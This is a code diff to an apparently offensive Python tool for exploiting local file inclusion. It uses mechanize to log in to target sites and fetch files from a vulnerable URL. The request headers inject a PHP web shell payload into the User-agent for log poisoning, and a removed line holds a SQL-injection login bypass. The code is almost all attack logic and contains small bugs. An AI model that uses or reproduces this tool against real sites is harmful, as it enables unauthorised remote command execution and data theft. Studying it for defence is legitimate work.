@@ -15,17 +15,28 @@ path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')
 class Aggressiv : 
 
         def __init__(self,**kwargs):          
-            if self.args.readuser:
-                 with open(self.args.readuser,'r') as username:
-                      self.args.user = username.read().replace('/n','')
-            if self.args.readpass:
-                 with open(self.args.readpass,'r') as password:
-                      self.args.password = password.read().replace('/n','') 
-            if self.args.aggress and not self.args.config:
-               with open(self.args.Cookie,'r') as Cookie_file :
-                      self.args.Cookie =  Cookie_file.read()
-            else:
-                           
+            try: 
+                with open(self .args.readuser,'r') as username:
+                        self.args.user = username.read().replace('/n','')  
+            except TypeError:
+                    pass         
+            if self.args.readpass or self.args.config:
+                try:
+                    with open(self.args.readpass,'r') as password:
+                       self.args.password = password.read().replace('/n','')
+                except TypeError:
+                    pass      
+            try:   
+                if self.args.Cookie  or self.args.config:
+                   with open(self.args.Cookie,'r') as Cookie_file :
+                      self.Cookie =  Cookie_file.read() 
+            except Exception as e :
+                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
+                   print("[*] Error : ",e )
+                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                   print("[*] Chech the File Name or File Path  to your Cookies File")
+                   exit()    
+
             print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
             if self.args.auth:
                print("[+] Mothead             : ................ | : Full authentication")    
@@ -37,65 +48,66 @@ class Aggressiv :
             print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
             if self.args.base64:
                print("[+] PHP-Filter          : ................ | : Convert-base64") 
-            print("[+] web Cookies         : ................ | : "+self.args.Cookie) 
+            print("[+] web Cookies         : ................ | : "+self.Cookie) 
         def Login_auth(self,**kwargs):
-          try:
-              loginurl = self.args.loginurl
-              request = mechanize.Browser()
-              request.set_handle_robots(False)
-              request.set_handle_redirect(True)
-              request.set_handle_refresh(True, max_time=1)
-              request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                   ('username',f'{self.args.user}'),
-                                   ('password',f'{self.args.password}')
-                                   ('Cookie',str(self.Cookie).replace('\n',''))]
-              url_login = request.open(loginurl) 
-              try: 
-                  request.select_form(nr = 0)
-              except Exception :
-                  try:
-                    request.select_form(nr = 1)
-                  except Exception:
-                     try:
-                       request.select_form(nr = 2)
-                     except Exception:      
-                        try:
-                           request.select_form(nr = 3)
-                        except Exception:
+            if self.args.auth:
+                try:
+                      loginurl = self.args.loginurl
+                      request = mechanize.Browser()
+                      request.set_handle_robots(False)
+                      request.set_handle_redirect(True)
+                      request.set_handle_refresh(True, max_time=1)
+                      request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                           ('username',f'{self.args.user}'),
+                                           ('password',f'{self.args.password}'),
+                                           ('Cookie',str(self.Cookie).replace('\n',''))]                     
+                      url_login = request.open(loginurl)    
+                      try: 
+                          request.select_form(nr = 0)
+                      except Exception :
+                          try:
+                            request.select_form(nr = 1)
+                          except Exception:
                              try:
-                                request.select_form(nr = 4)
-                             except Exception as e:
-                                  print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
-                                  print("[*] Error : ",e )
-                                  print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                                  print("[*] try to use with out login Mothead") 
-                                  print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
-                                  exit()                                   
+                               request.select_form(nr = 2)
+                             except Exception:      
+                                try:
+                                   request.select_form(nr = 3)
+                                except Exception:
+                                     try:
+                                        request.select_form(nr = 4)
+                                     except Exception as e:
+                                          print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
+                                          print("[*] Error : ",e )
+                                          print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                                          print("[*] try to use with out login Mothead") 
+                                          print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
+                                          exit()                                   
 
-              if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
-                   request["username"] = f'{self.args.user}'
-                   request["password"] = f'{self.args.password}' 
-              elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
-                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
-                   request["password"] = f'{self.args.password}'
-              elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
-                   request["username"] = '{self.args.user}'
-                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
-              elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
-                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
-                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
-              response   = request.submit()         
-              self.info = response.info()
-              content    = response.read()  
-              self.url = response.geturl()
-          except urllib.error.URLError as e:
-                print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
-                print("[*] Error : ",e )
-                print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                print("[*] Follow url Format ")
-                print("[*] url Format : http/https://<ip>:<port>/<dir>")  
-                print("[*] Example : http://10.10.10.193:4000/page=index.php")
-                exit()          
+                      if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
+                           request["username"] = f'{self.args.user}'
+                           request["password"] = f'{self.args.password}' 
+                      elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
+                           request[f'{self.args.UserForm}'] = f'{self.args.user}'
+                           request["password"] = f'{self.args.password}'
+                      elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
+                           request["username"] = '{self.args.user}'
+                           request[f'{self.args.PassForm}']=f'{self.args.password}' 
+                      elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
+                           request[f'{self.args.UserForm}'] = f'{self.args.user}'
+                           request[f'{self.args.PassForm}']=f'{self.args.password}' 
+                      response   = request.submit()         
+                      self.info = response.info()
+                      content    = response.read()  
+                      self.url = response.geturl()
+                except urllib.error.URLError as e:
+                    print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
+                    print("[*] Error : ",e )
+                    print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                    print("[*] Follow url Format ")
+                    print("[*] url Format : http/https://<ip>:<port>/<dir>")  
+                    print("[*] Example : http://10.10.10.193:4000/page=index.php")
+                    exit()          
         def url_request(self,**kwargs): 
           try:
            
@@ -132,9 +144,9 @@ class Aggressiv :
                     request.set_handle_refresh(True, max_time=1)              
                     request.addheaders = [('User-agent', 'Mozilla/5.0<?php echo system($_GET["cmd"]); ?>(X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                  Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                 ('Cookie',str(self.args.Cookie).replace('\n','')),
-                                 ('username',"admin'#"),
-                                 ('password','password')]
+                                 ('Cookie',str(self.Cookie).replace('\n','')),
+                                 ('username',f'{self.args.user}'),
+                                 ('password',f'{self.args.password}')]
                     try:             
                        first_req = request.open(self.args.Vulnurl).read()                                                      
                        self.Get_Oregnal_URL = request.open(self.url).read()
